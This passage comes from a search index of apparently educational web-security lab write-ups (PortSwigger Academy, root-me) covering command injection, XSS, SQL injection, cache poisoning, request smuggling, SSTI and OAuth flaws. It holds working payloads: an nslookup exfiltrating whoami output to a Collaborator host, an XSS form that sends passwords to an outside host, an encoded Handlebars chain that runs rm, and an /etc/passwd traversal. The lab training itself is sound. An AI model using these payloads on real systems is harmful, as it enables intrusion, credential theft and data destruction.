csrf=8hSNG1tBfEmAaa2HbN5ZobYzrgHHpdsO&name=Test&email=||nslookup+`whoami`.hk5vl3zdi4zucr2tr0c14z3qchi860up.oastify.com||&subject=out-of-band+data+exfiltration&message=is+possible Go back to the Collaborator tab, and click Poll now . You should see some DNS interactions that were initiated by the application as the result of your payload. If you don’t see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction. The Collaborator server received a DNS lookup of type A for the domain name peter-Xy4jpt.hk5vl3zdi4zucr2tr0c14z3qchi860up.oastify.com. The lookup was received from IP address 3.251.104.180:18037 at 2023-Feb-04 14:37:12.044 UTC. To complete the lab, enter the name of the current user, in this case peter-Xy4jpt . Exploitability  An attacker will need to execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator, and then enter the name of the current user to complete the lab. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server (or a C2).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fc5cbcbfb15007096fc87207630b178f",
    "u": "https://webapp.tymyrddin.dev/docs/os/4",
    "t": "Blind OS command injection with out-of-band interaction ",
    "c": "Blind OS command injection with out-of-band interaction  Description  This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that is accessible. However, it is possible to trigger out-of-band interactions with an external domain. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that submits feedback. Go to the Collaborator tab and click Copy to clipboard to copy a unique Burp Collaborator payload to your clipboard. In Repeater, modify the email parameter, changing it to something like: email=x||nslookup+x.xnoboj2tlk2af759ugfh7f66fxlo9fx4.oastify.com|| Send. In Collaborator, click Poll now , and view the Description: The Collaborator server received a DNS lookup of type A for the domain name x.xnoboj2tlk2af759ugfh7f66fxlo9fx4.oastify.com. The lookup was received from IP address 3.251.128.130:39343 at 2023-Feb-04 14:29:35.231 UTC Exploitability  An attacker will need to exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server. _Note: The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup. _",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5583f26beee63a257decfeca19d06b4f",
    "u": "https://webapp.tymyrddin.dev/docs/xss/27",
    "t": "Reflected XSS with AngularJS sandbox escape without strings ",
    "c": "Reflected XSS with AngularJS sandbox escape without strings  Description  The website in this lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS. Reproduction and proof of concept  Visit the following URL, replacing 0ae600ec04b3716dc12345280056003b with your lab ID: https://0ae600ec04b3716dc12345280056003b.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method to generate the payload by converting character codes into the string x=alert(1) . Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dfa567c0880ecb42781131b7d8f7571e",
    "u": "https://webapp.tymyrddin.dev/docs/os/2",
    "t": "Blind OS command injection with time delays ",
    "c": "Blind OS command injection with time delays  Description  This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=x||ping+-c+10+127.0.0.1|| POST /feedback/submit HTTP/1.1 Host: 0ab00001046ddc1bc07b1d4b00f600f4.web-security-academy.net Cookie: session=PBI3JYi8xuN2EDvHhrWZseFHddKXZkn3 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 162 Origin: https://0ab00001046ddc1bc07b1d4b00f600f4.web-security-academy.net Referer: https://0ab00001046ddc1bc07b1d4b00f600f4.web-security-academy.net/feedback Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close csrf=WyBp0kTPSNblM4Z6OFjvREdg9Eo7FyIf&name=Test&email=x||ping+-c+10+127.0.0.1||&subject=Love+it&message=Much+appreciated. Observe that the response takes 10 seconds to return. Exploitability  An attacker will need to exploit the blind OS command injection vulnerability to cause a 10 second delay.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c8f3cee46dfbc508785782bd96fa1810",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/sockets",
    "t": "Websocket vulnerabilities ",
    "c": "Websocket vulnerabilities  The websocket protocol is a protocol in the application layer of the OSI model, enabling full-duplex communication between a client (browser) and a web server. This makes it possible to create dynamic, real-time web applications such as instant messaging. WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any HTTP web security vulnerability can also exist in WebSockets communications. Steps  The two main tools for testing WebSockets are Burp Suite and OWASP ZAP . These tools allow for intercepting and modifying WebSockets frames on the fly. Check if there is indeed an authentication system and how it is implemented (access to functionalities without authentication). Test access control in detail to try to obtain a privilege escalation. Cross-Site WebSocket Hijacking (CSWH)  A WebSocket communication is initiated through HTTP communication via the WebSocket handshake. The client tells the server that it wants to initiate a WebSocket connection: GET /chat HTTP/1.1 Host: www.websocket.com:8000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Sec-WebSocket-Version: 13 Origin: http://www.websocket.com Sec-WebSocket-Key: xxxxxxxxxxxxxxxxxxxxxxx DNT: 1 Connection: keep-alive, Upgrade Cookie: X-Authorization=yyyyyyyyyyyyyyyyyyyyyyyyyyyy Pragma: no-cache Cache-Control: no-cache Upgrade: websocket The server accepts the connection with: HTTP/1.1 101 Switching Protocols Upgrade: WebSocket Connection: Upgrade Sec-WebSocket-Accept: zzzzzzzzzzzzzzzzzzzzzzzzzzzzz The WebSocket protocol does not let a server authenticate the client during the handshake process. Only the normal mechanisms for HTTP connections are available, including HTTP and TLS authentication and cookies. The upgraded handshake still happens from HTTP to WebSocket. The HTTP sends the authentication information directly to WS. And this can be exploited in Cross-Site WebSocket Hijacking (CSWH). The Cross-Site WebSocket Hijacking attack is possible when the WebSocket handshake is vulnerable to CSRF . The communication channel between the two parties (client/server) is created according to the origin of the opening request. If the protocol change request is only based on cookies, it is possible to lure a victim into initiating a request with its session on the attacker’s server. Escalation  Once the Websocket communication is initiated, the client and the server communicate asynchronously. The format of the exchanged data can be of any form. In practice, the most used WebSocket libraries use JSON format. If a CSWH attack is successful, it becomes possible to communicate with the server via WebSockets without a victim’s knowledge, to act in the place of a user, and also read the server messages sent via WebSockets. Portswigger lab writeups  Manipulating WebSocket messages to exploit vulnerabilities Manipulating the WebSocket handshake to exploit vulnerabilities Cross-site WebSocket hijacking Remediation  The WebSocket protocol does not have a native mechanism for authentication, so during development, a clean solution must be implemented. As with authentication, there is no system in the WebSocket protocol for managing authorisations, guaranteeing users only have access to the data and services they should have access to. This gives an attacker the ability to raise privileges vertically or to access a user’s data with the same level of rights the attacker has. The data entered by users, also via WebSockets, is the major cause of attacks: XSS, SQL injections, code injections, etc. All inputs must be sanitised with the most appropriate method according to the context, before being used. Data transmission via the WebSocket protocol is done in clear text just like HTTP. This data can be read and stolen in on-path attacks. To avoid information leakage, the WebSocket Secure ( wss ) protocol must be implemented. Using wss does not mean that the web application is secure, it is only the encrypted transport of data via TLS. To protect from Cross-Site WebSocket Hijacking, add a unique token per session that cannot be guessed as a parameter of the handshake request. Resources  Portswigger: Testing for WebSockets security vulnerabilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e7ea8ba6824e91b7457876684004a235",
    "u": "https://webapp.tymyrddin.dev/docs/cache/11",
    "t": "Combining web cache poisoning vulnerabilities ",
    "c": "Combining web cache poisoning vulnerabilities  Description  This lab is susceptible to web cache poisoning, but only if you construct a complex exploit chain. A user visits the home page roughly once a minute and their language is set to English. Reproduction  With Burp running, load the website’s home page. Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported. In Burp Repeater, experiment with the X-Forwarded-Host header. It can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts. The website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English: function initTranslations(jsonUrl) { const lang = document.cookie.split(';') .map(c => c.trim().split('=')) .filter(p => p[0] === 'lang') .map(p => p[1]) .find(() => true); const translate = (dict, el) => { for (const k in dict) { if (el.innerHTML === k) { el.innerHTML = dict[k]; } else { el.childNodes.forEach(el_ => translate(dict, el_)); } } } fetch(jsonUrl) .then(r => r.json()) .then(j => { const select = document.getElementById('lang-select'); if (select) { for (const code in j) { const name = j[code].name; const el = document.createElement(\"option\"); el.setAttribute(\"value\", code); el.innerText = name; select.appendChild(el); if (code === lang) { select.selectedIndex = select.childElementCount - 1; } } } lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]); }); } Go to the exploit server and edit the file name to match the path used by the vulnerable website: /resources/json/translations.json . In the head, add the header Access-Control-Allow-Origin: * to enable CORS. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: { \"en\": { \"name\": \"English\" }, \"es\": { \"name\": \"español\", \"translations\": { \"Return to list\": \"Volver a la lista\", \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\", \"Description:\": \"Descripción\" } } } Store the exploit. In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: lang=es Send the request to Burp Repeater. Add a cache buster like ?cb=1234 and the X-Forwarded-Host header with the exploit server ID: X-Forwarded-Host: exploit-server-id.exploit-server.net . Send and confirm that the exploit server is reflected in the response. To simulate the victim, load the URL in the browser and confirm that the alert() fires. The cache for the Spanish page is poisoned, but the target user’s language is set to English. It is not possible to exploit users with their language set to English, so a way to forcibly change language is needed. In Burp, go to Proxy -> HTTP history and study the requests and responses generated. When changing the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es . The user’s selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1 . Send the GET request for the home page to Burp Repeater and add a cache buster. The X-Original-URL can be used to change the path of the request to explicitly set /setlang/es . This response cannot be cached because it contains the Set-Cookie header. The home page sometimes uses backslashes as a folder separator. The server normalises these to forward slashes using a redirect. As a result, X-Original-URL: /setlang\\es triggers a 302 response that redirects to /setlang/es . This 302 response is cacheable and can be used to force other users to the Spanish version of the home page. Combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import the malicious JSON file from the exploit server. And while the cache is still poisoned, poison the GET / page using X-Original-URL: /setlang\\es to force all users to the Spanish page. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved. PoC  Exploitability  An attacker will need to poison the cache with multiple malicious responses simultaneously and coordinate this with the victim’s browsing behaviour.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f5873e4ea03e1e5725d3ab540422f799",
    "u": "https://webapp.tymyrddin.dev/docs/xss/15",
    "t": "Exploiting cross-site scripting to capture passwords ",
    "c": "Exploiting cross-site scripting to capture passwords  Description  The website in this lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. Reproduction and proof of concept  Using Burp Suite Professional, go to the Collaborator tab. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Enter the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <input name=username id=username> <input type=password name=password onchange=\"if(this.value.length)fetch('https://dyfm57w738b9ce3s2hdcovtg177yvojd.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });\"> This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server. Go back to the Collaborator tab, and click “Poll now”. You should see an HTTP interaction. If you don’t see any interactions listed, wait a few seconds and try again. Take a note of the value of the victim’s username and password in the POST body. Use the credentials to log in as the administrator user. Exploitability  To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server. And there is an alternative solution to this lab that does not require Burp Collaborator: adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF. This is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c3b65f756660eceecfdd0094a95af7de",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/2",
    "t": "DOM XSS via an alternative prototype pollution vector ",
    "c": "DOM XSS via an alternative prototype pollution vector  Description  This lab is vulnerable to DOM XSS via client-side prototype pollution. Reproduction and proof of concept  Load the lab in Burp’s built-in browser. Enable DOM Invader and enable the prototype pollution option. Open the browser DevTools panel and go to the DOM Invader tab and reload the page. Observe that DOM Invader has identified a prototype pollution vector in the search property i.e. the query string. Click Scan for gadgets . A new tab opens in which DOM Invader begins scanning for gadgets using the selected source. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab. Observe that DOM Invader has successfully accessed the eval() sink via the sequence gadget. Click Exploit. Observe that DOM Invader’s auto-generated proof-of-concept doesn’t trigger an alert() . Go back to the previous browser tab and look at the eval() sink again in DOM Invader . Notice that following the closing canary string, a numeric 1 character has been appended to the payload. Click Exploit again. In the new tab that loads, append a minus character ( - ) to the URL and reload the page. Observe that the alert(1) is called and the lab is solved. Exploitability  An attacker will need to find a source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget property that allows for executing arbitrary JavaScript; combine these to call alert() . This lab can be solved manually in a browser, or by using DOM Invader .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc6b645682836312f745b23d88538236",
    "u": "https://webapp.tymyrddin.dev/docs/os/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy OS command injection Labs Introduction  What?  OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Why?  Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization. How?  Remote code execution (RCE) OS command injection, simple case Blind OS command injection with time delays Blind OS command injection with output redirection Blind OS command injection with out-of-band interaction Blind OS command injection with out-of-band data exfiltration",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "69424340a9868a4234b877f9ad4ef300",
    "u": "https://webapp.tymyrddin.dev/docs/acl/2",
    "t": "Unprotected admin functionality with unpredictable URL ",
    "c": "Unprotected admin functionality with unpredictable URL  Description  This lab has an unprotected admin panel. It’s located at an unpredictable location, but the location is disclosed somewhere in the application. Reproduction and proof of concept  Review the lab home page’s source using Burp Suite or your web browser’s developer tools. It contains some JavaScript that discloses the URL of the admin panel. <script> var isAdmin = false; if (isAdmin) { var topLinksTag = document.getElementsByClassName(\"top-links\")[0]; var adminPanelTag = document.createElement('a'); adminPanelTag.setAttribute('href', '/admin-srvink'); adminPanelTag.innerText = 'Admin panel'; topLinksTag.append(adminPanelTag); var pTag = document.createElement('p'); pTag.innerText = '|'; topLinksTag.appendChild(pTag); } </script> Load the admin panel and delete carlos . Exploitability  An attacker will need to access the admin panel, and use it to delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0f04124e13592082463eaace39a0981c",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/1",
    "t": "Basic clickjacking with CSRF token protection ",
    "c": "Basic clickjacking with CSRF token protection  Description  This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word “click” on a decoy website. Reproduction and proof of concept  Log in and view my_account : <div id=\"account-content\"> <p>Your username is: wiener</p> <form class=\"login-form\" name=\"change-email-form\" action=\"/my-account/change-email\" method=\"POST\"> <label>Email</label> <input required=\"\" type=\"email\" name=\"email\" value=\"\"> <input required=\"\" type=\"hidden\" name=\"csrf\" value=\"O4MwyJB2zDsba2zSUiNUP2mIOXyxqsjd\"> <button class=\"button\" type=\"submit\"> Update email </button> </form> <form id=\"delete-account-form\" action=\"/my-account/delete\" method=\"POST\"> <input required=\"\" type=\"hidden\" name=\"csrf\" value=\"O4MwyJB2zDsba2zSUiNUP2mIOXyxqsjd\"> <button class=\"button\" type=\"submit\">Delete account</button> </form> </div> Create payload: The iframe src URL points to the target website vulnerable page. In this case, the page containing the “Update email” form, and depends on the unique lab-ID. An initial opacity of 0.1 to align the iframe actions and adjust the position values. Initial top and left values of resp 300px and 60px , to align the “Delete account” button with the “Test me” decoy action. <style> iframe { position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; } div { position: absolute; top: 300px; left: 60px; z-index: 1; } </style> <div>Test me</div> <iframe src=\"https://LAB-ID.web-security-academy.net/my-account\"></iframe> Go to the exploit server and paste the payload into the body field of the form. Click Store and then View exploit . Hover over “Test me” to make sure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, change the position of the div element by modifying the top and left properties of the style sheet. Change “Test me” to “Click me”, set opacity to 0.0001 , and click Store . And Deliver exploit to victim Exploitability  To solve the lab, an attacker needs to craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted. An account with credentials wiener:peter is available. Note: The victim will be using Chrome so test your exploit on that browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "976c92149f0b186cfabe4ee4e2b44253",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/7",
    "t": "Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ",
    "c": "Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability  Description  This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at /admin , but the front-end server blocks access to it. Reproduction and proof of concept  Try to visit /admin and observe that the request is blocked. In Burp Suite, go to the Repeater menu and ensure that the “Update Content-Length” option is unchecked. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 Observe that the merged request to /admin was rejected due to not using the header Host: localhost . Issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 Observe that you can now access the admin panel. Using the previous response as a reference, change the smuggled request URL to delete the user carlos : POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 Exploitability  An attacker will need to smuggle HTTP requests to access the /admin page, then delete a user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e61023968ef37bcc7a73aff6dbfa84a5",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/4",
    "t": "SQL injection UNION attack, finding a column containing text ",
    "c": "SQL injection UNION attack, finding a column containing text  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. The lab will provide a random value that you need to make appear within the query results. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter: '+UNION+SELECT+NULL,NULL,NULL-- Try replacing each null with the random value provided by the lab, for example: '+UNION+SELECT+'abcdef',NULL,NULL-- If an error occurs, move on to the next null and try that instead. Exploitability  An attacker needs to perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps determine which columns are compatible with string data.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "38bc046c6a8a7cfde6bbf36dee8f47c9",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/php1",
    "t": "PHP assert() ",
    "c": "PHP assert()  root-me challenge: PHP - assert() : Find and exploit the vulnerability to read the file .passwd . etcetera. Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert Resources  HackTricks: Code execution with Assert()",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0be5910cf45dd88f772c59d2460b8574",
    "u": "https://webapp.tymyrddin.dev/docs/xss/24",
    "t": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped ",
    "c": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  Description  The website in this lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. Reproduction and proof of concept  Enter a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Note the random string has been reflected inside a JavaScript template string. <script> var message = `0 search results for 'abcdef'`; document.getElementById('searchMessage').innerText = message; </script> Replace the input with the following payload to execute JavaScript inside the template string: ${alert(1)} Verify the technique worked by right-clicking, selecting “Copy URL”, and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9bf5f449d60b94686dce2e599c4ab054",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/6",
    "t": "File path traversal, validation of file extension with null byte bypass ",
    "c": "File path traversal, validation of file extension with null byte bypass  Description  This lab contains a file path traversal vulnerability in the display of product images. The application validates that the supplied filename ends with the expected file extension. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Modify the filename parameter, giving it the value: ../../../etc/passwd%00.png The response contains the contents of the /etc/passwd file. Exploitability  An attacker will need to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "efa6eb6962eee39edf406cf83eafcb59",
    "u": "https://webapp.tymyrddin.dev/docs/xss/3",
    "t": "DOM XSS in document.write sink using source location.search ",
    "c": "DOM XSS in document.write sink using source location.search  Description  The website in this lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search , which can be controlled using the website URL. Reproduction and proof of concept  Enter a random alphanumeric string into the search box. Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute. Break out of the img attribute: \"><script>alert('Hello World')</script> DOM XSS",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c6ccf3490252679436524915e96215c5",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/sql-string",
    "t": "SQL injection: string ",
    "c": "SQL injection: string  root-me challenge: SQL-injection-String : Retrieve the administrator password. ' UNION SELECT 1,2,3 -- SQLite3::query() Using PayloadAllTheThings: SQLiteInjection : 7 result(s) for \"' UNION SELECT NULL,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --\" (news) (users) 6 result(s) for \"' UNION SELECT NULL,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' --\" (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)) And: 8 result(s) for \"' UNION SELECT username,password FROM users --\"",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c1255474211b665d2656e1a708fe4970",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/4",
    "t": "Server-side template injection in an unknown language with a documented exploit ",
    "c": "Server-side template injection in an unknown language with a documented exploit  Description  This lab is vulnerable to server-side template injection. Reproduction and proof of concept  Notice that when you try to view more details about the first product, a GET request uses the message parameter to render Unfortunately this product is out of stock on the home page. Experiment by injecting a fuzz string containing template syntax from various different template languages, such as ${{<%[%'\"}}%\\ , into the message parameter. Notice that when you submit invalid syntax, an error message is shown in the output. <h4>Internal Server Error</h4> <p class=is-warning>/opt/node-v18.12.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: ${{&lt;%[%&apos;&quot;}}%\\ ... Node.js v18.12.1</p> This identifies that the website is using Handlebars . Search the web for “Handlebars server-side template injection”. You should find a well-known exploit posted by @Zombiehelp54 . Modify this exploit so that it calls require(\"child_process\").exec(\"rm /home/carlos/morale.txt\") as follows: wrtz{{#with \"s\" as |string|}} {{#with \"e\"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub \"constructor\")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push \"return require('child_process').exec('rm /home/carlos/morale.txt');\"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this: https://0a8300980334079dc186be5500ae00fa.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d The lab should be solved when you load the URL. Exploitability  An attacker will need to identify the template engine and find a documented exploit online that can be used to execute arbitrary code, and to delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "132997866f7d72731fa2ba8f24bfbf91",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/4",
    "t": "Stealing OAuth access tokens via an open redirect ",
    "c": "Stealing OAuth access tokens via an open redirect  Description  This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application. Reproduction and proof of concept  While proxying traffic through Burp, click My account and complete the OAuth login process ( wiener:peter ). Afterwards, you will be redirected back to the blog website. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater. Log out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater. In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it’s being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ directory traversal sequence. Log out of your account on the blog website and turn on proxy interception in Burp. In your browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy. Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to: https://0afd00940493f56bc11235de000a00cb.web-security-academy.net/oauth-callback/../post?postId=1 Forward any remaining requests and observe that you are eventually redirected to the first blog post. In your browser, notice that your access token is included in the URL as a fragment. 8. With the help of Burp, audit the other pages on the blog website. Identify the Next post option at the bottom of each blog post, which works by redirecting users to 